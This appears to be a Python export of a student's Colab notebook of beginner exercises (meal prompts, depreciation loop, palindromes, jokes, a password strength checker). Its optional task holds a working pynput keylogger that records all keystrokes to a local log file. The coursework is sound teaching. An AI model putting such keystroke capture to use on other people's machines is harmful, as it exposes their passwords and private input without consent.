# -*- coding: utf-8 -*-
"""Satwant Kaur-Cyber-TTA-Week1.ipynb

Automatically generated by Colaboratory.

Original file is located at
    https://colab.research.google.com/drive/1XPh2G-xSG-UKw5tSM8XEsHoS6wZaew9A

#week 1

#1.  Write a program that allows user to  enter his favourite starter, main  course, dessert and drink. Output a message which says – “Your  favourite meal is ………with a glass  of….”
"""

fav_starter = input("What is your favourite starter?") 
fav_main = input("What is your favourite main meal?") 
fav_dessert = input("What is your favourite dessert?") 
fav_drink = input("What is your favourite drink?") 

print("Your favourite meal is " + fav_starter +", "+ fav_main + ", " + fav_dessert + " with a glass of " + fav_drink)

"""# 2. A motorbike costs £2000 and loses  10% of its value every year. Print the bike’s value every year until  it falls below £1000."""

motorbike = 2000
lessthan1000 = False

Yr1value = motorbike / 100*90
Yr1value = str(Yr1value)
print("The 1st year value of the motorbike is: "+ Yr1value)
lessthan1000 = False

Yr1value = float(Yr1value)
Yr2value = Yr1value / 100 * 90
Yr2value = str(Yr2value)
print("The 2nd year value of the motorbike is: "+ Yr2value)
lessthan1000 = False

Yr2value = float(Yr2value)
Yr3value = Yr2value / 100 * 90
Yr3value = str(Yr3value)
print("The 3rd year value of the motorbike is: "+ Yr3value)
lessthan1000 = False

Yr3value = float(Yr3value)
Yr4value = Yr3value / 100 * 90
Yr4value = str(Yr4value)
print("The 4th year value of the motorbike is: "+ Yr4value)
lessthan1000 = False

Yr4value = float(Yr4value)
Yr5value = Yr4value / 100 * 90
Yr5value = str(Yr5value)
print("The 5th year value of the motorbike is: "+ Yr5value)
lessthan1000 = False

Yr5value = float(Yr5value)
Yr6value = Yr5value / 100 * 90
Yr6value = str(Yr6value)
print("The 6th year value of the motorbike is: "+ Yr6value)
lessthan1000 = False

Yr6value = float(Yr6value)
Yr7value = Yr6value / 100 * 90
Yr7value = str(Yr7value)
print("The 7th year value of the motorbike is: "+ Yr7value)
lessthan1000= True

if lessthan1000 == True:
  print("Motorbike is now worth less than a £1000")

"""#second attempt"""

motorbike = 2000
year = 1

while(motorbike > 1000):
  print("The motorbike costs: " + str(motorbike) +" at Year: "+ str(year))
  motorbike = motorbike * 0.9
  year +=1

"""#week 2

1. Generate a fake address with latitude and longitude using faker.
"""

!pip install faker

from faker import Faker
fake = Faker()

fa = fake.address()
print(fa)

fl = fake.latlng()
print(fl)

"""##2. Numpy practice"""

import numpy as np
e = np.random.random((2,2))
numones = np.ones((2,2))
print(e)
print(numones)

"""# 3.a Write a program that asks for a student’s mark and then displays their exam grade. 
(The programme
can be developed further to show if
the student is meeting their target
grades based on exam results that
they provide.)

"""

mark1 = int(input("Enter student mark?")) 
mark2 = int(input("Enter student mark?")) 
mark3 = int(input("Enter student mark?")) 
mark4 = int(input("Enter student mark?")) 

marks = mark1+mark2+mark3+mark4
total_marks = marks/4

print(total_marks)

if total_marks < 40:
  print("The learner has failed with this total mark: ", total_marks)
elif (total_marks <=100):
  print("learner has passed with this total mark: ", total_marks)
else:
  print("invalid marks entered.")

"""#3.b Write a program that takes in a word and says whether or not it is a palindrome.
(A palindrome is a word that is the
same backwards as forwards like
noon and radar).

Reference: Method using one extra variable: In this method user take a character of string one by one and store in an empty variable. After storing all the character user will compare both the string and check whether it is palindrome or not. https://www.geeksforgeeks.org/python-program-check-string-palindrome-not/
"""

palindrome = input("If your word a palindrome? ->>>type your word: ") 
 
w = ""
for i in palindrome:
    w = i + w
 
if (palindrome == w):
    print("Yes")
else:
    print("No")

"""# 4. Create a joke machine program
(i.e. The computer tells a joke based
on what options has been selected)
"""

joke = int(input("****The Joke Machine***** Choose a number between 1-10 to find your joke: "))
if joke == 1:
  print("What do you call a bird who stars in action movies?  Steven Seagull!")
elif (joke == 2):
  print("What do you call a pineapple that plays the trumpet? Tooty fruity!")
elif (joke == 3):
  print("What do you call an insect with a pack of cards? Ant and Deck!")
elif (joke == 4):
  print("What do you call a woman with a frog on her head? Lily! ")
elif (joke == 5):
  print("Someone stole my mood ring! I’m not sure how I feel about that")
elif (joke == 6):
  print("Why don’t scientists trust atoms? Because they make up everything!")
elif (joke == 7):
  print("Did you hear the song about the tortilla? To be honest, it was more like a wrap")
elif (joke == 8):
  print("What’s an Emperor’s favourite food? Ceasar salad!! ")
elif (joke == 9):
  print("What did the lettuce say to the carrot? Peas be mine?! ")
elif (joke == 10):
  print("Why did the puny lettuce go to the gym? It wanted to get shredded ")
else:
  print("What do you call a.....wait a minute, is this some kind of joke??? Come on...enter a number ONLY between 1 and 10 :D")

"""OPTIONAL HOME LEARNING TASK 5:
KEY LOGGER OR PASSWORD CHECKER
1. Create a Keylogger program after reviewing the Keylogger pdf file.

"""

import pynput
from pynput.keyboard import Key, Listener

count=0 #counter which verifies how often to update the file
keys=[] #array of keys

#function that takes in the key pressed and writes it to file

def on_press(key):
  global keys, count

  keys.append(key)
  count+=1
  print("{0} pressed".format(key))

  if count >=10:
    count=0
    write_file(keys)
    keys=[]

def write_file(keys): #writes keys logged to a file
  with open("log.txt", "a") as f: #takes parameter keys and creates a file called log.txt
    for key in keys: #for loop iterates through each key in the array and adds a space
      k = str(key).replace("'","")

      if k.find("space")>0:
        f.write('\n')
      elif k.find("Key") ==-1:
        f.write(k)

def on_release(key): #press escape to exit the program
  if key == Key.esc:
    return False

with Listener(on_press=on_press, on_release=on_release) as listener:
  listener.join()

"""**2. Create a password validation checking program, the program will ask the user to input a password, reenter the password and the tells the user if the password is weak, medium or strong.**"""

def passwordCheck():
  pwd = (input("Enter your password: ")) #Enter the password

  if len(pwd) < 8: #if character is less than 8, then print below message
   print("password much be 8 characters or more")
   passwordCheck()#repeat the function until length of password is more than 8
  else:
    numChk = any(c.isdigit() for c in pwd)#check each char (c) if it contains a number, returns bool
    #print(numChk)
    upChk = any(c.isupper() for c in pwd) #check each char (c) if it contains uppercase, returns bool
    #print(upChk)
    lowChk = any(c.islower() for c in pwd)#check each char (c) if it contains lowercase, returns bool
    #print(lowChk)

    if numChk == True and upChk == True and lowChk == True:#if password contains a combo of upper, lower and digits, print "strong"
      print("strong password")
    elif (numChk == True and upChk == False and lowChk == True):#if password contains a combo of lowercase and digits only, print "medium"
      print("medium password")
    elif (numChk == True and upChk == True and lowChk == False):#if password contains a combo of uppercase and digits only, print "medium"
      print("medium password")
    elif (numChk == False and upChk == True and lowChk == True):#if password contains a combo of upper and lowercase only, print "medium"
      print("medium password")
    else: #any other password is weak
      print("weak password")

passwordCheck()

